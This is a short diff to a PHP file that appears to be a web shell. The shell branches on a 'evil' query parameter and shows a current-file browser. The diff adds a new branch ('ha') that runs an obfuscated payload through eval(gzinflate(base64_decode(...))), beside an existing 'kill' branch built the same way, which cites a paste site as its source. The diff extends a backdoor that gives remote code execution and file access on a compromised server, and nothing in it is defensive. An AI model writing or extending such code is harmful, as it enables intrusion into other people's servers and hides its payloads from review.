@@ -249,7 +249,8 @@ eval(gzinflate(base64_decode('pZdNTsMwEIXXReIOJpuWBbFA7Bp1A0vuULmO21R14sg/QG9P2p
 } elseif($_GET['evil'] == 'kill') {
 // Source codenya : https://ghostbin.co/paste/hyxr4/raw
 eval(gzinflate(base64_decode('U0nLzEnNzMtUsFVQiQ92DQpzDYpWD3YO8gwIiXfz9HH1c/R1VY+15uUqyk3JLNJQTy3LzCkpz8yLL67MVde0RhdNzs9LQxWOB4uXZeQXlwAlSvNyMvOyNVSgtmoCDU5NzshXULcpsHOqTE1VsFKy0S+wU7cGAA==')));
-}
+} elseif($_GET['evil'] == 'ha') {
+eval(gzinflate(base64_decode('vVJNa9tAED270P8wCINkENY9lQVykMGtqwRZLuQk1tvZaOP1rtgPUgj5711ZdhLTBJxLD2K1b+a9eTOzzElquZKwJ5o/OCJJNHZaxDDmhk/g6euX0WjMOpgBUx3KqIdjCB6DybdDiLY+RD2j4ZLbaEBhBANm0KrORj4rhutNtbq5rRt/eHUfvSB3vizz6q6u8nK9KKoYrHZ4Aa0q6k1Vfpq2Xq+aX0W1XNzdFj2NEWFOPIDRh7zFclX4llg35Gq0TsuhDP5B2icPkQNEhTL4irHj/cRW24YJZ9rjKN/8P/uPs4hxgV6XG2ui8GVr067twslxYUhbBUFKUVrUWcqUtFlKoNXIZuGYOSGScyJYou/RzsJmK4jchVmWwc+8Wn7f5GUO6xaFgDRNE5KlyaCWHMWDgzNAP6mhtnf4+pSC1trOXCWJJo/Te25bt3UGNfUSnj6lap/Mb+ofZb1Kdh5TvS/jZQ/2qBK8dxfEwZnb4NTmf+/zrNF3qy+I385vsAqoRmLxH/Wr6APlfox/AQ==')));}
 echo "</td></tr>";
 if(isset($_GET['filesrc'])){
 echo "<tr><td>Current File : ";
